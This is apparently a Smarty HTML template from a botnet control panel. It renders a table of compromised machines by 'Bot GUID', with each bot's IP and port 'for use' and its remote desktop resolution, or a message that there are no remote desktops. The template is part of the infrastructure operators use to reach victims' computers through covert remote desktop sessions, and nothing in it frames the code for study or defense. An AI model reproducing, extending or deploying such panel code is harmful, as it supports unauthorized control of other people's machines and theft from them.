<h2><b>Server</b>: {$HOST}</h2>
<hr size='1' color='#CCC'>

<table width="720px" cellspacing="0" cellpadding="0" border="1" style="border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;">

<th width='20px' style='background: rgb(80,80,80); color: rgb(232,232,232);'>#</th>
<th width='480px' style='background: rgb(80,80,80); color: rgb(232,232,232);'>Bot GUID</th>
<th width='220px' style='background: rgb(80,80,80); color: rgb(232,232,232);'>IP:Port for use</th>
<th width='220px' style='background: rgb(80,80,80); color: rgb(232,232,232);'>Desktop Settings (W<small>x</small>H<small>x</small>D)</th>

{foreach from=$CONT_ARR item=REC}
<tr><td align='center'>{$REC.I}</td><td align='center'>{$REC.GUID}</td><td align='center'><input readonly value='{$REC.HOST}:{$REC.PORT}' style='width: 140px; background: rgb(0,0,0); color: rgb(0,255,0);'></td><td align='center'>{$REC.w}<small>x</small>{$REC.h}<small>x</small>{$REC.d}</td></tr>
{foreachelse}
<tr><td colspan='3' class='error' style='text-align:center;'>There are no Remote Desktops</td></tr>
{/foreach}

</table>